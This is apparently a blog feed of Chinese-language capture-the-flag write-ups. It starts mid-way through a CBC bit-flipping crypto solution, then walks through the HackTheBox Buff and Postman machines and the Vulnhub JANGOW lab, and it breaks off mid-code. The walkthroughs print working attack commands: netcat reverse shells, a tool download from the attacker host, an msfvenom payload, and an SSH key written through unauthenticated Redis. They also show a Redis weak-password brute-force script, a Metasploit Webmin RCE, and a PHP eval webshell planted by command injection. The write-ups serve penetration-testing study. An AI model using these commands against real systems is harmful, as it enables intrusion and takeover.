Cipher_Block_2</span><br></pre></td></tr></table></figure><p>得到的<code>Tmp_Cipher_Block_1</code>视为随机生成，可以轻松得到<code>Tmp_Plain_Block_Payload</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tmp_Plain_Block_Payload = Tmp_Cipher_Block_1 ^ target</span><br></pre></td></tr></table></figure><p>我们所需要确保的，就是这个<code>Tmp_Plain_Block_Payload</code>可以被UTF-8编码处理</p><p>在爆破出<code>Tmp_Plain_Block_Payload</code>之后，由于<code>Tmp_Cipher_Block_Payload</code>与<code>Cipher_Block_1</code>相等，<code>Cipher_Block_2</code>为预期值</p><p>输入<code>Cipher_Block_0 + Tmp_Cipher_Block_Payload + Cipher_Block_2</code>即可获得Flag</p><hr/><h2 id=""><a class="markdownIt-Anchor" href="#"></a> 😅</h2><p>不需要验证前面的&quot;logged_username=&quot;是吧</p><p>直接字节翻转就完事了</p><p>密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logged_username&#x3D;    Admin&amp;password&#x3D;g    0ld3n_b0y</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;A&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br><span class="line">New_Block_Cipher_0[<span class="number">0</span>] = <span class="string">&quot;A&quot;</span> ^ <span class="string">&quot;a&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>代入得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure><hr /><p>难怪做的有点费劲，原来是非预期了啊😅，感觉这个思路都能出个题了都</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Dramatically solved.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="CBC" scheme="https://yoloyolo.top/tags/CBC/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Buff</title>
    <link href="https://yoloyolo.top/2023/02/14/HackTheBox-Buff/"/>
    <id>https://yoloyolo.top/2023/02/14/HackTheBox-Buff/</id>
    <published>2023-02-14T15:29:28.000Z</published>
    <updated>2023-02-14T15:30:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="hackthebox_buff"><a class="markdownIt-Anchor" href="#hackthebox_buff"></a> HackTheBox_Buff</h1><p><code>2020/07/27 16:23:58</code></p><h2 id="前期工作"><a class="markdownIt-Anchor" href="#前期工作"></a> 前期工作</h2><p>连接服务器，服务器连接代理</p><p><img src="/images/hackthebox_buff/00.png" alt="" /></p><p>网络状态</p><p><img src="/images/hackthebox_buff/01.png" alt="" /></p><p>靶机</p><p><img src="/images/hackthebox_buff/02.png" alt="" /></p><p><img src="/images/hackthebox_buff/03.png" alt="" /></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198</code></p><p><img src="/images/hackthebox_buff/04.png" alt="" /></p><h3 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h3><p><code>gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/05.png" alt="" /></p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>代理浏览器</p><p><code>proxychains firefox</code></p><p>得到CMS相关信息</p><p><img src="/images/hackthebox_buff/06.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit Gym 1.0</code></p><p><img src="/images/hackthebox_buff/07.png" alt="" /></p><p>执行EXP<br /><code>proxychains python 48506.py http://10.10.10.198:8080/</code></p><p><img src="/images/hackthebox_buff/08.png" alt="" /></p><p>获取Shell</p><p><img src="/images/hackthebox_buff/09.png" alt="" /></p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>服务器开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9900</code></p><p><img src="/images/hackthebox_buff/10.png" alt="" /></p><p>下载nc与plink</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;nc.exe</span><br><span class="line">curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;plink.exe</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/11.png" alt="" /></p><p>使用nc反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9999</span><br><span class="line">nc.exe -e cmd.exe 10.10.16.4 9999</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/12.png" alt="" /></p><p>后台进程中发现CloudMe<br /><code>tasklist | findstr CloudMe</code></p><p><img src="/images/hackthebox_buff/13.png" alt="" /></p><p>该进程在本地开启了8888端口<br /><code>netstat -ano | findstr 2556</code></p><p><img src="/images/hackthebox_buff/14.png" alt="" /></p><p>使用plink进行端口转发<br /><code>plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD</code></p><p><img src="/images/hackthebox_buff/15.png" alt="" /></p><p>查看服务器端口<br /><code>netstat -antlp | grep 9901</code></p><p><img src="/images/hackthebox_buff/16.png" alt="" /></p><p>搜索相关漏洞<br /><code>searchsploit cloudme</code></p><p><img src="/images/hackthebox_buff/17.png" alt="" /></p><p>使用EXP <a href="http://44470.py">44470.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44470.py</span><br><span class="line">cat 44470.py</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox_buff/18.png" alt="" /></p><p>使用msfvenom构造payload<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c</code></p><p>修改payload，且修改端口为9901之后上传EXP至服务器<br /><code>scp 44470.py root@hk:/root/</code></p><p>监听端口4444<br /><code>nc -lvnp 4444</code></p><p>执行EXP<br /><code>python 44470.py</code></p><p>提权成功</p><p><img src="/images/hackthebox_buff/19.png" alt="" /></p><p>查看flag</p><p><img src="/images/hackthebox_buff/20.png" alt="" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Postman</title>
    <link href="https://yoloyolo.top/2023/02/14/HackTheBox-Postman/"/>
    <id>https://yoloyolo.top/2023/02/14/HackTheBox-Postman/</id>
    <published>2023-02-14T15:22:53.000Z</published>
    <updated>2023-02-14T15:29:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="hackthebox_postman"><a class="markdownIt-Anchor" href="#hackthebox_postman"></a> HackTheBox_Postman</h1><p><code>2020/01/15 19:55:48</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 9326 closed ports, 672 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">6379/tcp  open  redis   Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: MiniServ/1.910</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; Charset=iso-8859-1).</span></span><br><span class="line"><span class="string">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)</span></span><br><span class="line"><span class="string">No exact OS matches for host (test conditions non-ideal).</span></span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p>尝试爆破80端口下的Web路径<br />未发现有效信息</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>尝试直接登入redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure><p>利用redis未授权写入ssh密钥，再用ssh登入redis账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~&#x2F;.ssh&#x2F;id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat ~&#x2F;.ssh&#x2F;id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; new.txt</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">cat new.txt | redis-cli -h 10.10.10.160 -x set crackit</span><br><span class="line">redis-cli -h 10.10.10.160 config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">redis-cli -h 10.10.10.160 save</span><br><span class="line">ssh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure><p>无法在<code>/var/www/html/</code>目录下写入WebShell</p><p>发现文件<code>/opt/id_rsa.bak</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;opt</span><br><span class="line"></span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak</span><br></pre></td></tr></table></figure><p>可以确定是Matt账户的ssh密钥</p><p>拷贝到本地之后再用脚本转为john可以破解的密码形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa.bak &gt; ssh</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh</span><br><span class="line">    computer2008</span><br></pre></td></tr></table></figure><p>得到Matt账户的口令，使用SSH登入Matt账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh Matt@10.10.10.160</span><br><span class="line">computer2008</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>在MSF中搜索Webmin的相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search webmin</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                         Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                         ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</span><br><span class="line">   1  auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure       2006-06-30       normal     No     Webmin File Disclosure</span><br><span class="line">   2  exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution</span><br><span class="line">   3  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor</span><br><span class="line">   4  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution</span><br><span class="line">   5  exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE</span><br></pre></td></tr></table></figure><p>MSF中调用漏洞利用工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce</span><br><span class="line">set payload cmd&#x2F;unix&#x2F;reverse_netcat</span><br><span class="line">set LHOST 10.10.16.14</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set USERNAME Matt</span><br><span class="line">set PASSWORD computer2008</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>Redis登入之后，可以考虑写入一句话后门/phpinfo这个思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>而这台靶机中无法在<code>/var/www/html/</code>目录下写入文件，提权也比较困难，只能写入SSH密钥</p><p>附：<br />Redis弱口令探测脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># -*-  coding:utf-8 -*-</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">PASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]</span><br><span class="line">def check(ip, port, timeout):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;INFO\r\n&quot;)</span><br><span class="line">        result &#x3D; s.recv(1024)</span><br><span class="line">        if &quot;redis_version&quot; in result:</span><br><span class="line">            return u&quot;未授权访问&quot;</span><br><span class="line">        elif &quot;Authentication&quot; in result:</span><br><span class="line">            for pass_ in PASSWORD_DIC:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, int(port)))</span><br><span class="line">                s.send(&quot;AUTH %s\r\n&quot; %(pass_))</span><br><span class="line">                result &#x3D; s.recv(1024)</span><br><span class="line">                if &#39;+OK&#39; in result:</span><br><span class="line">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ip&#x3D;sys.argv[1]</span><br><span class="line">    port&#x3D;sys.argv[2]</span><br><span class="line">    print check(ip,port, timeout&#x3D;10)</span><br></pre></td></tr></table></figure><hr /><p>nmap扫描速度巨慢，而且总是会扫漏几个端口，甚至扫全端口时总是会中途因为900s的数据包延迟而中断扫描…(体验极差)</p><p>Redis的操作完全没有接触过，十分生疏</p><p>Webmin的漏洞利用倒是异常的顺利</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">redis</a><br /><a href="https://mp.weixin.qq.com/s/xF8GsjumqZhGe2Ue2XppGw">wp</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_JANGOW_1.0.1</title>
    <link href="https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/"/>
    <id>https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/</id>
    <published>2023-02-14T11:59:27.000Z</published>
    <updated>2023-02-14T15:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Vulnhub年靶机数量</p><table><thead><tr><th style="text-align:center">Year</th><th style="text-align:center">Num</th></tr></thead><tbody><tr><td style="text-align:center">…</td><td style="text-align:center">…</td></tr><tr><td style="text-align:center">2018</td><td style="text-align:center">65</td></tr><tr><td style="text-align:center">2019</td><td style="text-align:center">117</td></tr><tr><td style="text-align:center">2020</td><td style="text-align:center">223</td></tr><tr><td style="text-align:center">2021</td><td style="text-align:center">108</td></tr><tr><td style="text-align:center">2022</td><td style="text-align:center">1</td></tr></tbody></table><p>难免对于一个时代的落幕感到惋惜</p><p>但同时庆幸自己能够在最好的时间参与其中</p><p>在学习的过程中享受这个过程</p><p>Thank you, Vulnhub &amp; every author.</p><p>Thank you for what I learned and every wonderful challenge I enjoyed.</p><a id="more"></a><h1 id="jangow-101"><a class="markdownIt-Anchor" href="#jangow-101"></a> <a href="https://www.vulnhub.com/entry/jangow-101,754/">JANGOW: 1.0.1</a></h1><p><code>2023-02-14 06:59:27</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="ip探测"><a class="markdownIt-Anchor" href="#ip探测"></a> IP探测</h3><p><code>nmap -sn 192.168.56.0/24 | grep -B 2 Virtual</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.118</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2021-06-10 18:05  site/</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.041 days (since Tue Feb 14 06:38:08 2023)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Unix</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.56.118/ -w</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/ ----</span><br><span class="line">+ http://192.168.56.118/server-status (CODE:403|SIZE:279)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/ </span><br></pre></td></tr></table></figure><p><code>dirb http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/site/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/assets/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/css/                                          </span><br><span class="line">+ http://192.168.56.118/site/index.html (CODE:200|SIZE:10190)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/wordpress/</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问<code>http://192.168.56.118/site/</code></p><p>点击右上角<code>Buscar</code>按钮跳转至<code>http://192.168.56.118/site/busque.php?buscar=</code></p><p>简单测试后发现命令执行漏洞</p><p><code>curl http://192.168.56.118/site/busque.php?buscar=ls</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assets</span><br><span class="line">busque.php</span><br><span class="line">css</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>以防万一，确认一下黑名单</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=cat+./busque.php'</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;buscar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确认写入权限</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=ls+-la'</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">drwxr-xr-x 6 www-data www-data  4096 Feb 13 17:59 .</span><br><span class="line">drwxr-xr-x 3 root     root      4096 Oct 31  2021 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  1584 Feb 13 17:59 \</span><br><span class="line">drwxr-xr-x 3 www-data www-data  4096 Jun  3  2021 assets</span><br><span class="line">-rw-r--r-- 1 www-data www-data    35 Jun 10  2021 busque.php</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 css</span><br><span class="line">-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 js</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 wordpress</span><br></pre></td></tr></table></figure><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=id'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>尝试反弹Shell，失败</p><p>尝试通过Web服务传递Webshell，失败</p><p>疑似Ban了主动请求</p><p><code>echo -n '&lt;?php eval($_POST[&quot;BFL&quot;]);?&gt;' | base64</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/busque.php?buscar=echo+-n+PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==|base64+-d&gt;bfl.php&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">weevely generate Bufferfly BFL.php</span><br><span class="line">cat BFL.php | base64</span><br><span class="line"></span><br><span 